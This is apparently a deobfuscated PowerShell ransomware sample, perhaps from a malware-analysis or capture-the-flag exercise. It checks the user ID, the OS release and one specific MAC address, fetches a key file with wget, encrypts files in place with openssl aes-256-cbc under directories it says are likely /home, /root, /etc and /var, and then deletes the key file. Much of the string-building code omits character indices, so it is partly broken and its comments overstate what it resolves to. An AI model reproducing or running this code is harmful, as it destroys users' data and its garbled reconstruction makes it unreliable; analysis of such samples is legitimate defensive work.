# Deobfuscated version of bash.ps1
# Original script heavily obfuscated function and variable names,
# and dynamically constructed commands.

# Main orchestrator function that calls other functions in sequence.
function Main-ExecutionOrchestrator
{
    Write-Verbose "Starting script execution..."
    Test-EnvironmentPrerequisites
    Generate-CharacterSetFromOSRelease
    Download-PayloadFile
    Encrypt-UserFiles
    Remove-PayloadFile
    Write-Verbose "Script execution finished. Exiting."
    exit
}

# Checks if the script is running in the intended environment.
# Exits if any prerequisite is not met.
function Test-EnvironmentPrerequisites
{
    Write-Verbose "Performing environment prerequisite checks..."

    # Check 1: User ID must be 1.
    # Original: if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]){exit}
    # Deobfuscated: Checks if the User ID is not equal to 1.
    # `&(Get-Command /???/id) -u` dynamically finds and runs `id -u`.
    # `[byte]` defaults to 0. `[bool][byte]` becomes `[bool]0` which is $false.
    # `-not [bool][byte]` becomes `$true`.
    # In a numeric comparison, `$true` is 1. So, `UID -cne 1` means "UID not equal to 1".
    $currentUserID = -1
    try {
        $currentUserID = [int](& (Get-Command -Name "id" -CommandType Application -ErrorAction Stop) -u)
    } catch {
        Write-Error "Failed to get current User ID using 'id -u'. Exiting."
        exit 1
    }

    if ($currentUserID -ne 1) {
        Write-Warning "Prerequisite failed: Script must be run as User ID 1, but was $currentUserID. Exiting."
        exit 1
    }
    Write-Verbose "Prerequisite check: User ID is 1."

    # Check 2: OS Release must contain "noble" (e.g., Ubuntu 24.04 Noble Numbat).
    # Original: if (-not ((&(Get-Command /???/?at) /etc/*release*) | grep noble)){exit}
    # Deobfuscated: `cat /etc/*release* | grep noble`. Exits if "noble" is not found.
    $osReleaseInfo = ""
    try {
        $osReleaseInfo = (& (Get-Command -Name "cat" -CommandType Application -ErrorAction Stop) /etc/*release*)
    } catch {
        Write-Error "Failed to read /etc/*release* files using 'cat'. Exiting."
        exit 1
    }

    if (-not ($osReleaseInfo | & (Get-Command -Name "grep" -CommandType Application -ErrorAction Stop) "noble")) {
        Write-Warning "Prerequisite failed: OS Release does not contain 'noble'. Exiting."
        exit 1
    }
    Write-Verbose "Prerequisite check: OS Release contains 'noble'."

    # Check 3: MAC address of enp0s3 must be "08:00:27:eb:6b:49".
    # Original: if ((&(Get-Command /???/?at) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit} # intentional guard
    # Deobfuscated: `cat /sys/class/net/enp0s3/address`. Exits if MAC does not match.
    $macAddress = ""
    try {
        $macAddress = (& (Get-Command -Name "cat" -CommandType Application -ErrorAction Stop) /sys/class/net/enp0s3/address).Trim()
    } catch {
        Write-Error "Failed to read MAC address from /sys/class/net/enp0s3/address using 'cat'. Exiting."
        exit 1
    }

    if ($macAddress -cne "08:00:27:eb:6b:49") {
        Write-Warning "Prerequisite failed: MAC address '$macAddress' does not match '08:00:27:eb:6b:49'. Exiting."
        exit 1
    }
    Write-Verbose "Prerequisite check: MAC address matches."
    Write-Host "All environment prerequisites met."
}

# Generates a character set from OS release information and digits 0-9.
# This character set is used later to construct strings (URLs, filenames, commands).
function Generate-CharacterSetFromOSRelease
{
    Write-Verbose "Generating dynamic character set..."
    $osReleaseContentLines = @()
    try {
        # Reads all lines from files matching /etc/*release*
        $rawContent = (& (Get-Command -Name "cat" -CommandType Application -ErrorAction Stop) /etc/*release*)
        if ($rawContent -is [array]) {
            $osReleaseContentLines = $rawContent
        } else {
            $osReleaseContentLines = $rawContent -split '\r?\n'
        }
    } catch {
        Write-Error "Failed to read /etc/*release* for character set generation. Exiting."
        exit 1
    }

    # The original script concatenates various parts of the /etc/*release* files.
    # This is a direct translation of that concatenation logic.
    # The exact content depends on the specific /etc/*release* files.
    $concatenatedOsInfoString = $osReleaseContentLines +
                                ($osReleaseContentLines[1] -split '=') +
                                $osReleaseContentLines[2] +
                                ($osReleaseContentLines[3] -split '=') +
                                ($osReleaseContentLines[4] -split '=') +
                                $osReleaseContentLines[5] +
                                ($osReleaseContentLines[6] -split '=') +
                                ($osReleaseContentLines[7] -split '=') +
                                $osReleaseContentLines[8] +
                                $osReleaseContentLines[9] +
                                $osReleaseContentLines[10] +
                                $osReleaseContentLines[11] +
                                $osReleaseContentLines[12] +
                                $osReleaseContentLines +
                                $osReleaseContentLines +
                                $osReleaseContentLines +
                                $osReleaseContentLines

    $characterArrayWithDigits = $concatenatedOsInfoString.ToCharArray() + (0..9 | ForEach-Object { $_.ToString() })
    
    $Global:dynamicCharacterSet = -join ($characterArrayWithDigits | Sort-Object -Unique)
    Write-Verbose "Dynamic character set generated. Length: $($Global:dynamicCharacterSet.Length)"
    # For debugging: Write-Host "Generated charset: $Global:dynamicCharacterSet"
}

# Downloads a payload file. The URL and local filename are constructed
# using the globally generated dynamic character set.
function Download-PayloadFile
{
    Write-Verbose "Preparing to download payload file..."

    # Construct the payload URL from the dynamic character set.
    # Original: $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA = $GLOBAL:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[3] +... + 'k' +...
    # The specific indices (3, 5, 12, etc.) pick characters from $Global:dynamicCharacterSet.
    # This is a placeholder for the actual construction logic.
    $payloadUrl = $Global:dynamicCharacterSet[3] + $Global:dynamicCharacterSet[5] + $Global:dynamicCharacterSet[12] + `
                  $Global:dynamicCharacterSet[8] + $Global:dynamicCharacterSet[7] + $Global:dynamicCharacterSet[12] + `
                  $Global:dynamicCharacterSet[1] + $Global:dynamicCharacterSet[6] + $Global:dynamicCharacterSet[5] + `
                  $Global:dynamicCharacterSet[12] + $Global:dynamicCharacterSet[6] + $Global:dynamicCharacterSet[5] + `
                  $Global:dynamicCharacterSet + $Global:dynamicCharacterSet[3] + $Global:dynamicCharacterSet[1] + `
                  $Global:dynamicCharacterSet[3] + $Global:dynamicCharacterSet[3] + $Global:dynamicCharacterSet[7] + `
                  $Global:dynamicCharacterSet + 'k' + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet
    
    # Construct the local filename for the payload (a single character from the charset).
    # Original: $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA = $GLOBAL:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    $Global:payloadLocalFilename = $Global:dynamicCharacterSet # Used by Remove-PayloadFile and Encrypt-UserFiles

    Write-Host "Attempting to download payload from URL: $payloadUrl"
    Write-Host "Payload will be saved as: $Global:payloadLocalFilename"

    try {
        # Original: &(Get-Command /???/?ge?) $payloadUrl -q -O $payloadLocalFilename
        # Deobfuscated: Uses `wget` to download the file.
        & (Get-Command -Name "wget" -CommandType Application -ErrorAction Stop) $payloadUrl -q -O $Global:payloadLocalFilename
        Write-Host "Payload downloaded successfully as $Global:payloadLocalFilename."
    } catch {
        Write-Error "Failed to download payload using 'wget'. URL: $payloadUrl. Filename: $Global:payloadLocalFilename. Error: $($_.Exception.Message). Exiting."
        exit 1
    }
}

# Encrypts files in specified user directories.
# It uses Invoke-Expression to run dynamically constructed 'find' and 'openssl' commands.
function Encrypt-UserFiles
{
    Write-Verbose "Starting file encryption process..."

    # The encryption key/passphrase is taken from the downloaded payload file.
    # The filename itself ($Global:payloadLocalFilename) is used in the -pass argument for openssl.
    $encryptionPassFileArgument = "file:$($Global:payloadLocalFilename)"

    # Define target directory strings (these were constructed from the charset in the original)
    # The original script constructed these paths like '/home', '/root', '/etc', '/var'
    # using characters from $Global:dynamicCharacterSet.
    # Example reconstruction of original path components:
    # $path_home = $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # e.g., /home
    # $path_root = $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # e.g., /root
    # $path_etc  = $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # e.g., /etc
    # $path_var  = $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # e.g., /var
    
    # For clarity, using common paths that are likely targets for ransomware.
    # The actual paths depend on the characters resolved from $Global:dynamicCharacterSet.
    $targetBasePathsToScan = @(
        # Path 1: Likely /home
        ($Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet),
        # Path 2: Likely /root
        ($Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet),
        # Path 3: Likely /etc
        ($Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet),
        # Path 4: Likely /var
        ($Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet)
    )

    # Constructing parts of the 'find' and 'openssl' commands from the charset
    # 'find' command parts
    $findCmdPart = 'f' + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "find"
    $typePart = $Global:dynamicCharacterSet[11] + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "-type"
    $fileTypePart = 'f' # "f" for file

    # 'openssl' command parts
    $opensslCmdPart = $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "openssl"
    $encPart = $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "enc"
    $cipherPart = $Global:dynamicCharacterSet[11] + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet[11] + $Global:dynamicCharacterSet[2] + $Global:dynamicCharacterSet[5] + $Global:dynamicCharacterSet[6] + $Global:dynamicCharacterSet[11] + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "-aes-256-cbc"
    $passArgPart = $Global:dynamicCharacterSet[11] + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "-pass"
    # $encryptionPassFileArgument is "file:" + $Global:payloadLocalFilename
    $inArgPart = $Global:dynamicCharacterSet[11] + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "-in"
    $outArgPart = $Global:dynamicCharacterSet[11] + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet + $Global:dynamicCharacterSet # "-out"

    foreach ($basePath in $targetBasePathsToScan) {
        Write-Host "Scanning for files to encrypt in: $basePath"
        
        # Construct the 'find' command string
        # Original: 'f' + charset_parts + ' ' + path_parts + ' ' + type_parts + ' ' + 'f'
        $findCommandToExecute = "$findCmdPart '$basePath' $typePart $fileTypePart"
        Write-Verbose "Executing find command: $findCommandToExecute"

        $filesToEncrypt = @()
        try {
            # Original: &(Get-Command I?????-E?????????) ($findCommandToExecute)
            $filesToEncrypt = Invoke-Expression $findCommandToExecute
        } catch {
            Write-Warning "Error executing find command for path '$basePath': $($_.Exception.Message)"
            continue # Skip to next base path
        }

        if ($null -eq $filesToEncrypt -or $filesToEncrypt.Count -eq 0) {
            Write-Verbose "No files found in $basePath."
            continue
        }

        foreach ($filePathToEncrypt in $filesToEncrypt) {
            if (-not ($filePathToEncrypt -is [string]) -or [string]::IsNullOrWhiteSpace($filePathToEncrypt)) {
                Write-Warning "Invalid file path found: '$filePathToEncrypt'. Skipping."
                continue
            }
            $filePathToEncrypt = $filePathToEncrypt.Trim()
            Write-Host "Attempting to encrypt file: $filePathToEncrypt"

            # Construct the 'openssl' command string
            # Original: "" + charset_parts_for_openssl +... + " $filePathToEncrypt " +...
            $opensslCommandToExecute = "$opensslCmdPart $encPart $cipherPart $passArgPart $encryptionPassFileArgument $inArgPart ""'$filePathToEncrypt'"" $outArgPart ""'$filePathToEncrypt'"""
            Write-Verbose "Executing openssl command: $opensslCommandToExecute"
            
            try {
                # Original: &(Get-Command I?????-E?????????) ($opensslCommandToExecute)
                Invoke-Expression $opensslCommandToExecute
                Write-Host "Successfully encrypted: $filePathToEncrypt"
            } catch {
                Write-Warning "Failed to encrypt file '$filePathToEncrypt'. Error: $($_.Exception.Message)"
            }
        }
    }
    Write-Verbose "File encryption process completed."
}

# Removes the downloaded payload file.
function Remove-PayloadFile
{
    Write-Verbose "Removing downloaded payload file: $Global:payloadLocalFilename"
    if (Test-Path $Global:payloadLocalFilename) {
        try {
            # Original: &(Get-Command R?m???-I???) $Global:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            # Deobfuscated: Uses Remove-Item to delete the file.
            & (Get-Command -Name "Remove-Item" -ErrorAction Stop) -Path $Global:payloadLocalFilename -Force
            Write-Host "Payload file '$Global:payloadLocalFilename' removed successfully."
        } catch {
            Write-Warning "Failed to remove payload file '$Global:payloadLocalFilename'. Error: $($_.Exception.Message)"
        }
    } else {
        Write-Warning "Payload file '$Global:payloadLocalFilename' not found for removal."
    }
}

# --- Script Entry Point ---
# Call the main orchestrator function to start the script.
Main-ExecutionOrchestrator